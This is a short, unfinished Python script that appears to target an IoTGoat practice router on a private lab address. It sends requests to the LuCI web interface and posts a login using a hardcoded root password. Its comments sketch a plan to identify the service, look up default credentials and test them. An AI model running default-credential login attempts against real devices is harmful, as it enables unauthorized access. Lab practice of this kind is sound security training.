import requests
import json


def discover_webpage(target, port=80):
    r = requests.get(f'http://{target}:{port}', verify=False, allow_redirects=True)

r = requests.get('https://192.168.56.110/cgi-bin/luci', verify=False, allow_redirects=True)
print(r.text)

_data = 'luci_username=root&luci_password=iotgoathardcodedpassword'
r = requests.post('https://192.168.56.110/cgi-bin/luci', data=_data, verify=False)
print(r)
#Get the service name
#Query for default credentials
#Test them

#luci_username=duh&luci_password=duhs

